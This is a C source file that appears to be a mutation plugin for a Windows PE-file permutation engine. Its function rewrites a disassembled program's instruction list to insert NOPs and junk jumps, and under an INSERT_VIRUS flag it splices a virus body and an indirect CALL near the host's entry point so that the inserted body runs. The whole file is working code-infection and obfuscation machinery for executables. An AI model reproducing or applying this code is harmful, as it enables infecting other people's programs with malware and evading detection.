
////////x///////x///////x///////x///////x///////x///////x///////x///////x////

#define USER_DUMP_MSG

#define INSERT_NOP                      // insert NOP
//#define INSERT_HOOY                   //
//#define INSERT_VIRUS

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

#include "mz.hpp"
#include "pe.hpp"

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

void id3() { __emit__( 0xEB,0x02,0xFF,3 ); }

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

void x_memcpy(void *dest, void *src, DWORD n);
void x_memset(void *dest, int c, DWORD n);

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

// returns: 0 if success

int __cdecl my_mutate(
            DWORD           user_arg,
            PE_HEADER*      pe,
            PE_OBJENTRY*    oe,
            hooy*           root,
            int    __cdecl  user_disasm(DWORD,BYTE*),
            void*  __cdecl  user_malloc(DWORD,DWORD),
            DWORD  __cdecl  user_random(DWORD,DWORD)
            )
{

#ifdef INSERT_HOOY
  for (hooy* h=root; h; h=h->next)
  if (h->flags & (FL_OPCODE|FL_FIXUP))
  if (h->next->flags & FL_OPCODE)
  if (h->dataptr[0] != 0xEB)
  {
    hooy* z = (hooy*) user_malloc(user_arg,sizeof(hooy));
    z->flags = FL_OPCODE | FL_CODE | FL_PRESENT | FL_VPRESENT;
    z->datalen = 5;
    z->dataptr = (BYTE*) user_malloc(user_arg,z->datalen);
    z->dataptr[0] = 0xEB;
    z->dataptr[1] = 0x03;
    z->dataptr[2] = '•';
    z->dataptr[3] = '“';
    z->dataptr[4] = '‰';
    z->next = h->next;
    h->next = z;
  }
#endif // INSERT_HOOY

#ifdef INSERT_NOP
  for (hooy* h=root; h; h=h->next)
  if (h->flags & (FL_OPCODE|FL_FIXUP))
  if (h->next->flags & FL_OPCODE)
  if (h->dataptr[0] != 0x90)
  {
    hooy* z = (hooy*) user_malloc(user_arg,sizeof(hooy));
    z->flags = FL_OPCODE | FL_CODE | FL_PRESENT | FL_VPRESENT;
    z->datalen = 1;
    z->dataptr = (BYTE*) user_malloc(user_arg,z->datalen);
    z->dataptr[0] = 0x90;
    z->next = h->next;
    h->next = z;
  }
#endif // INSERT_NOP

#ifdef INSERT_VIRUS

/*
      call dword ptr x
x     dd body
*/

  // insert body

  for (int pass=0, count=0; pass<2; pass++)
  {
    for (hooy* h=root; h; h=h->next)
    if (h->flags & FL_STOP)
    if (!(h->next->flags & FL_FIXUP))
    {
      if (pass == 0)
        count++;
      else
      if (count-- == 0)
      {
#ifdef USER_DUMP_MSG
        printf("<body>\n");
#endif

        hooy* z1 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        z1->flags = FL_LABEL | FL_DREF | FL_PRESENT | FL_VPRESENT;
        z1->oldrva = 1;
        z1->datalen = 0;
        z1->dataptr = NULL;

        hooy* z2 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        z2->flags = FL_DATA | FL_PRESENT | FL_VPRESENT;
//      z2->dataptr = (BYTE*) user_malloc(user_arg,z2->datalen = 256);
//      x_memset(z2->dataptr, 0xCC, z2->datalen);
//      z2->dataptr[1] = 0xC3;

        z2->datalen = *(DWORD*)(user_arg+0x10);
        z2->dataptr = (BYTE*)(*(DWORD*)(user_arg+0x14));

        z1->next = z2;
        z2->next = h->next;
        h->next = z1;

        break;
      } // count==0
    } // h
    if (pass == 0)
    {
      if (count == 0) return 1;
      count = user_random(user_arg,count);
    }
  }//pass

  // insert DD body

  for (int pass=0, count=0; pass<2; pass++)
  {
    for (hooy* h=root; h; h=h->next)
//  if ((h->flags & FL_OPCODE) && (*(WORD*)&h->dataptr[0] == 0x25FF))
//  if (h->next->flags & FL_FIXUP)
    if (h->flags & FL_STOP)
    if (!(h->next->flags & FL_FIXUP))
    {
      if (pass == 0)
        count++;
      else
      if (count-- == 0)
      {
#ifdef USER_DUMP_MSG
        printf("<DD body>\n");
#endif
        hooy* z1 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        z1->flags = FL_LABEL | FL_DREF | FL_PRESENT | FL_VPRESENT;
        z1->oldrva = 2;
        z1->datalen = 0;
        z1->dataptr = NULL;

        hooy* z2 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        z2->flags = FL_FIXUP | FL_PRESENT | FL_VPRESENT;
        z2->dataptr = (BYTE*) user_malloc(user_arg,z2->datalen = 4);
        z2->arg1 = 1;

        z1->next = z2;
        z2->next = h->next;
        h->next = z1;

        break;
      }//count==0
    }//h
    if (pass == 0)
    {
      if (count == 0) return 2;
      count = user_random(user_arg,count);
    }
  }//pass

  // insert CALL

  int j = 0, ok = 0;
  for (hooy* h=root, *h0=h; h; h0=h, h=h->next)
  {
    if (j == 0)
    if ( (h->oldrva == pe->pe_entrypointrva) &&
         (h->flags & FL_OPCODE) ) j = 1;

    if (j == 1)
    if (h->flags & FL_OPCODE)
    if (!(h->flags & (FL_HAVEREL|FL_FIXUP)))
    if ( (h->next->next->flags & FL_STOP) ||
         (h->next->next->next->flags & FL_STOP) ||
         (h->next->next->next->next->flags & FL_STOP) )
    {
#ifdef USER_DUMP_MSG
      printf("<call>\n");
#endif
      hooy* z1 = (hooy*) user_malloc(user_arg,sizeof(hooy));
      z1->flags = FL_OPCODE | FL_CODE | FL_PRESENT | FL_VPRESENT;
      z1->dataptr = (BYTE*) user_malloc(user_arg,z1->datalen = 2);
      z1->dataptr[0] = 0xFF; // call dword ptr [...]
      z1->dataptr[1] = 0x15;

      hooy* z2 = (hooy*) user_malloc(user_arg,sizeof(hooy));
      z2->flags = FL_FIXUP | FL_CODE | FL_PRESENT | FL_VPRESENT;
      z2->dataptr = (BYTE*) user_malloc(user_arg,z2->datalen = 4);
      z2->arg1 = 2;

      z1->next = z2;
      z2->next = h0->next;
      h0->next = z1;

      ok++;
      break;
    }
  }
  if (!ok) return 3;

#endif // INSERT_VIRUS

  DWORD t = (DWORD)user_arg+(DWORD)pe+(DWORD)oe+(DWORD)root+
            (DWORD)user_disasm+(DWORD)user_malloc+(DWORD)user_random;
  t *= 0;

  return t;             // success
}

void x_memcpy(void *dest, void *src, DWORD n)
{
  while (n--) *((BYTE*)dest)++ = *((BYTE*)src)++;
}
void x_memset(void *dest, int c, DWORD n)
{
  while (n--) *((BYTE*)dest)++ = c;
}

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

void id4() { __emit__( 0xEB,0x02,0xFF,4 ); }

////////x///////x///////x///////x///////x///////x///////x///////x///////x////
